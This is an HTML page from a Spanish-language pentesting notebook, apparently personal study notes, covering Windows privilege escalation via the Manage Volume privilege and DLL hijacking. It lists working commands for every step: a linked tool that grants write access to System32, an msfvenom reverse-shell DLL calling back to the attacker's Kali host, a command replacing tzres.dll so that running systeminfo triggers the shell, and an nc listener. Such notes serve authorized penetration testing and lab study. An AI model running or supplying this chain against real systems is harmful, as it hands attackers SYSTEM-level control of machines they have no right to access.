@@ -1,0 +1,85 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Manage Volume | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="manage-volume">
+          <div class="note-tabbar">
+            <span>Manage Volume</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Windows/Privilegios</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / windows / privilegios</p>
+            <h2>Manage Volume</h2>
+
+            <h2>DLL Hijacking</h2>
+
+            <p><a href="https://daniel10barredo.github.io/PrivEscAssist_Windows/tools/FsctlSdGlobalChange.exe">FsctlSdGlobalChange.exe</a></p>
+
+            <section class="code-card">
+              <h3>PowerShell: Obtener permisos de escritura y lectura en System32</h3>
+              <pre><code>.\FsctlSdGlobalChange.exe
+icacls C:\Windows\System32
+# BUILTIN\Users:(M= Modify)
+# BUILTIN\Users:(OI=Se hereda archivos)(CI=Se hereda subcarpetas)(IO=Aplica a hijos)(F=Full Control)
+# BUILTIN\Users:(RX= Read Execute)
+# BUILTIN\Users:(OI)(CI)(IO)(GR= Generic Read,GE= Generic Execute)</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Kali: Payload DLL</h3>
+              <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;kali_ip&gt; LPORT=443 -f dll -o rev.dll</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>PowerShell: Copiamos el payload en el path de Systeminfo</h3>
+              <pre><code>copy rev.dll &quot;C:\Windows\System32\wbem\tzres.dll&quot;
+systeminfo
+# Al ejecutar systeminfo se ejecuta rev.dll y obtenemos la Rev_Shell</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Kali: Listener</h3>
+              <pre><code>rlwrap nc -nlvp 443</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>privilegios</span>
+              <span>manage</span>
+              <span>volume</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
